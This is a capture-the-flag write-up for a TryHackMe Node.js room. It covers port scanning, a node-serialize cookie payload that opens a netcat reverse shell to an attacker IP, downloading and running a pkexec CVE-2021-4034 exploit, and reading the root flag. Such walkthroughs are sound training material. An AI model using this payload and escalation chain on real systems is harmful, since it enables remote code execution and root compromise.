## VulnNet:Node
https://tryhackme.com/room/vulnnetnode

## Enum
```
nmap -Pn -sC -sV 10.10.249.120 -vv

PORT     STATE SERVICE REASON         VERSION
8080/tcp open  http    syn-ack ttl 61 Node.js Express framework
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS

nmap -Pn -sC -sV ip.thm -p 8080 -A

PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
```
![image](https://user-images.githubusercontent.com/6504854/190453572-5b79952d-fc21-465b-8405-9140cacf286c.png)

![image](https://user-images.githubusercontent.com/6504854/190453646-5bf4fc68-fe4b-417c-a9c8-922afdfb026b.png)

https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

![image](https://user-images.githubusercontent.com/6504854/190455639-f09253f2-0929-42cb-8279-2cc34bed8c58.png)

```
{"username":"_$$ND_FUNC$$_function (){require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) });}()","isGuest":false,"encoding": "utf-8"}
```
🏴 Cookie:session payload is base64 encoded code. 

## Flag
```
listening on [any] 4444 ...
/bin/sh: 0: can't access tty; job control turned off

$ python3 -c 'import pty; pty.spawn("/bin/bash")';
www@vulnnet-node:~/VulnNet-Node$ ls -la /usr/bin/pkexec

ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 22520 Mar 27  2018 /usr/bin/pkexec

www@vulnnet-node:~/VulnNet-Node$ curl http://10.10.10.10/1.tar -o 1.tar

% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 92160  100 92160    0     0  39300      0  0:00:02  0:00:02 --:--:-- 39300

www@vulnnet-node:~/VulnNet-Node$ tar -xvf 1.tar
tar -xvf 1.tar
./cve-2021-4034
./README.md

www@vulnnet-node:~/VulnNet-Node$ ./cve-2021-4034
./cve-2021-4034

# cat /root/root.txt
cat /root/root.txt
THM{ab*****************************}

# ls /home
ls /home
serv-manage  www

# cat /home/serv-manage/user.txt
cat /home/serv-manage/user.txt
THM{06*****************************}
#
```
Thank you for your time and Happy Hacking. 😋

ちゃんとやるのはどなたかのみてくだされ～、ちゃんとやったけどとてもよくできてるので。

Terminarlがー激重なんす。。。。どうして。



